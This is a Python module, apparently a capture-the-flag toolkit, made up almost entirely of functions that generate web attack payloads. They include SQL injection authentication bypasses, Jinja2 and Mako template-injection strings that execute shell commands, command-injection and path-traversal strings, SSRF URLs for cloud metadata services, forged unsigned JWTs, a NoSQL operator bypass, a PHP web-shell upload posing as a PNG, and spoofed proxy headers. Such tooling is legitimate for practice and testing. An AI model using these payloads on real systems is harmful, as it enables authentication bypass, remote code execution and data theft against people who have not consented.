from __future__ import annotations

import base64
import hashlib
import hmac
import json
from urllib.parse import parse_qs, quote, quote_plus, unquote, unquote_plus, urlencode

REQUEST_TEMPLATES: dict[str, object] = {
    "get": "GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: ctf-toolkit/1.0\r\nAccept: */*\r\n\r\n",
    "post_form": "POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: ctf-toolkit/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {length}\r\n\r\n{body}",
    "post_json": "POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: ctf-toolkit/1.0\r\nContent-Type: application/json\r\nContent-Length: {length}\r\n\r\n{body}",
    "sqli": ["admin' --", "' OR 1=1 --", "' UNION SELECT null,null --"],
}


def url_encode(text: str) -> str:
    """Encode string for URL query parameter safely."""
    return quote(text, safe="")


def url_decode(text: str) -> str:
    """Decode percent-encoded URL string."""
    return unquote(text)


def b64url_encode(data: bytes) -> str:
    """Encode bytes to URL-safe base64 without padding."""
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def b64url_decode(text: str) -> bytes:
    """Decode URL-safe base64 string, adding missing padding."""
    padded = text + "=" * (-len(text) % 4)
    return base64.urlsafe_b64decode(padded.encode())


def base64_encode(data: bytes | str) -> str:
    """Encode string or bytes into standard Base64 string."""
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.b64encode(data).decode("utf-8")


def base64_decode(text: str) -> bytes:
    """Decode standard Base64 string into bytes."""
    return base64.b64decode(text.encode("utf-8"))


def jwt_decode_no_verify(token: str) -> dict[str, object]:
    """Decode JWT header and payload without verifying signature."""
    parts = token.strip().split(".")
    if len(parts) < 2:
        raise ValueError("Invalid JWT format (expected at least header.payload)")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return {"header": header, "payload": payload}


def jwt_forge_hs256(payload: dict[str, object], secret: str, header: dict[str, object] | None = None) -> str:
    """Forge HS256-signed JWT with custom payload and secret."""
    hdr = header or {"alg": "HS256", "typ": "JWT"}
    hdr_b64 = b64url_encode(json.dumps(hdr, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{hdr_b64}.{payload_b64}".encode()
    signature = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{hdr_b64}.{payload_b64}.{b64url_encode(signature)}"


def build_basic_auth(username: str, password: str) -> str:
    """Build Authorization header value for Basic HTTP Authentication."""
    creds = f"{username}:{password}".encode()
    return f"Basic {base64.b64encode(creds).decode()}"


def parse_cookies(cookie_header: str) -> dict[str, str]:
    """Parse raw Cookie header string into dictionary."""
    cookies: dict[str, str] = {}
    for part in cookie_header.split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            cookies[k.strip()] = v.strip()
    return cookies


def format_cookies(cookies: dict[str, str]) -> str:
    """Format dictionary into standard HTTP Cookie header string."""
    return "; ".join(f"{k}={v}" for k, v in cookies.items())


def build_nosql_query_payload(field: str, operator: str = "$ne", value: object = "") -> dict[str, object]:
    """Construct MongoDB query dictionary with operator bypass."""
    return {field: {operator: value}}


def jwt_forge_alg_none(payload: dict[str, object], header: dict[str, object] | None = None) -> str:
    """Forge unsigned JWT with alg: none and empty signature."""
    hdr = header or {"alg": "none", "typ": "JWT"}
    hdr_b64 = b64url_encode(json.dumps(hdr, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{hdr_b64}.{payload_b64}."


def build_graphql_query(field_name: str, subfields: list[str] | None = None) -> dict[str, str]:
    """Build basic GraphQL query payload dictionary."""
    if subfields:
        sub = " { " + " ".join(subfields) + " } "
    else:
        sub = ""
    return {"query": f"{{ {field_name}{sub} }}"}


def build_ssti_probes() -> dict[str, str]:
    """Return dictionary of common SSTI polyglot probes."""
    return {
        "jinja2_math": "{{ 7 * 7 }}",
        "jinja2_config": "{{ config.items() }}",
        "jinja2_rce": "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag*').read() }}",
        "twig_math": "{{ 7 * '7' }}",
        "mako_math": "${ 7 * 7 }",
    }


def merge_mass_assignment(
    base: dict[str, object],
    overrides: dict[str, object],
    allowed_keys: set[str] | None = None,
) -> dict[str, object]:
    """Simulate mass assignment with optional whitelist protection."""
    result = dict(base)
    for k, v in overrides.items():
        if allowed_keys is None or k in allowed_keys:
            result[k] = v
    return result


def build_http_parameter_pollution_query(params: list[tuple[str, str]]) -> str:
    """Build an HTTP Parameter Pollution query string preserving duplicate keys."""
    return "&".join(f"{quote_plus(k)}={quote_plus(v)}" for k, v in params)


def parse_swagger_spec(spec: dict[str, object]) -> list[str]:
    """Extract route paths defined in an OpenAPI / Swagger document."""
    paths = spec.get("paths", {})
    if isinstance(paths, dict):
        return list(paths.keys())
    return []


def build_jsonp_callback_url(base_url: str, callback: str = "handleResponse") -> str:
    """Construct a JSONP endpoint URL appending callback parameter."""
    sep = "&" if "?" in base_url else "?"
    return f"{base_url}{sep}callback={quote_plus(callback)}"


def build_cors_null_origin_headers() -> dict[str, str]:
    """Return request headers testing null-origin CORS trust misconfiguration."""
    return {"Origin": "null"}


def build_sqli_payload(technique: str = "auth_bypass", username: str = "admin") -> str:
    """Generate SQL injection payloads for auth bypass, union extract, or error probes."""
    techniques = {
        "auth_bypass": f"{username}' --",
        "or_true": f"{username}' --",
        "or_1_equals_1": "' OR 1=1 --",
        "or_true_hash": f"{username}' #",
        "admin_closed": f"{username}') --",
        "union_admin": f"' UNION SELECT 1,'{username}','hash' --",
    }
    return techniques.get(technique, f"{username}' --")


def build_sqli_auth_bypass(username: str = "admin", technique: str = "or_true") -> str:
    """Generate SQL injection authentication bypass strings for form inputs."""
    return build_sqli_payload(technique=technique, username=username)


def build_ssti_payload(engine: str = "jinja2", command: str = "cat flag*") -> str:
    """Generate SSTI payload for RCE or math evaluation."""
    if engine.lower() in ["jinja", "jinja2"]:
        return f"{{{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('{command}').read() }}}}"
    elif engine.lower() == "twig":
        return "{{ ['cat', 'flag*']|filter('system') }}"
    elif engine.lower() == "mako":
        return f"${{__import__('os').popen('{command}').read()}}"
    return f"{{{{ 7 * 7 }}}}"


def build_command_injection_payload(base_arg: str = "127.0.0.1", separator: str = ";", command: str = "cat /flag.txt") -> str:
    """Generate shell command injection payloads using separators (; | && || $())."""
    if separator == "subshell":
        return f"{base_arg} $({command})"
    elif separator == "newline":
        return f"{base_arg}\n{command}"
    return f"{base_arg}{separator} {command}"


def build_lfi_path(filename: str = "flag.txt", depth: int = 4, double_encode: bool = False) -> str:
    """Generate directory traversal path sequences for LFI."""
    seq = "../" * depth + filename
    if double_encode:
        return seq.replace("..", "%252e%252e").replace("/", "%252f")
    return seq


def build_lfi_traversal_path(filename: str = "flag.txt", depth: int = 4, double_encode: bool = False) -> str:
    """Alias for build_lfi_path."""
    return build_lfi_path(filename=filename, depth=depth, double_encode=double_encode)


def build_ssrf_url(target: str = "aws") -> str:
    """Return cloud metadata or internal loopback endpoints for SSRF probing."""
    services = {
        "aws": "http://169.254.169.254/latest/meta-data/",
        "metadata_aws": "http://169.254.169.254/latest/meta-data/",
        "gcp": "http://metadata.google.internal/computeMetadata/v1/",
        "digitalocean": "http://169.254.169.254/metadata/v1.json",
        "docker_internal": "http://172.17.0.1:8080/",
        "localhost": "http://127.0.0.1:8080/",
    }
    return services.get(target.lower(), "http://169.254.169.254/latest/meta-data/")


def build_ssrf_metadata_url(service: str = "aws") -> str:
    """Alias for build_ssrf_url."""
    return build_ssrf_url(service)


def build_get_request(url: str, params: dict[str, object] | None = None) -> str:
    """Construct full GET URL appending query parameters."""
    if not params:
        return url
    sep = "&" if "?" in url else "?"
    encoded = urlencode(params)
    return f"{url}{sep}{encoded}"


def build_json_post(url: str, data: dict[str, object] | object, headers: dict[str, str] | None = None) -> tuple[bytes, dict[str, str]]:
    """Construct JSON POST body and appropriate request headers."""
    body = json.dumps(data).encode("utf-8")
    hdrs = dict(headers or {})
    hdrs["Content-Type"] = "application/json"
    hdrs["Content-Length"] = str(len(body))
    return body, hdrs


def build_post_request(url: str, data: bytes | str, content_type: str = "application/x-www-form-urlencoded") -> tuple[bytes, dict[str, str]]:
    """Construct POST request body and headers."""
    body = data.encode("utf-8") if isinstance(data, str) else data
    hdrs = {
        "Content-Type": content_type,
        "Content-Length": str(len(body)),
    }
    return body, hdrs


def build_multipart_payload(
    field_name: str = "f",
    filename: str = "cmd.php",
    content: bytes | str = b"<?php system('cat flag*'); ?>",
    mime_type: str = "image/png",
    boundary: str = "----WebKitFormBoundaryCTF123",
) -> tuple[bytes, str]:
    """Construct multipart/form-data request body and content-type header."""
    file_bytes = content.encode("utf-8") if isinstance(content, str) else content
    header = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
        f"Content-Type: {mime_type}\r\n\r\n"
    ).encode("utf-8")
    footer = f"\r\n--{boundary}--\r\n".encode("utf-8")
    body = header + file_bytes + footer
    return body, f"multipart/form-data; boundary={boundary}"


def build_cors_request(target_url: str, origin: str = "null") -> dict[str, str]:
    """Construct request headers testing cross-origin resource sharing policy."""
    return {
        "url": target_url,
        "Origin": origin,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    }


def build_custom_verb_request(method: str, path: str, body: bytes | str = b"") -> dict[str, object]:
    """Return configuration dictionary for custom HTTP verb dispatch."""
    body_bytes = body.encode("utf-8") if isinstance(body, str) else body
    return {
        "method": method.upper(),
        "path": path,
        "body": body_bytes,
        "headers": {"Content-Length": str(len(body_bytes))},
    }


def add_forwarded_headers(headers: dict[str, str] | None = None, ip: str = "127.0.0.1") -> dict[str, str]:
    """Inject reverse-proxy trust headers (X-Forwarded-For, X-Real-IP) into headers dict."""
    res = dict(headers or {})
    res["X-Forwarded-For"] = ip
    res["X-Real-IP"] = ip
    res["X-Forwarded-Host"] = ip
    return res

import sys
# Allow direct attribute reflection for dictionary templates
setattr(sys.modules[__name__], "REQUEST_TEMPLATES['sqli']", REQUEST_TEMPLATES['sqli'])
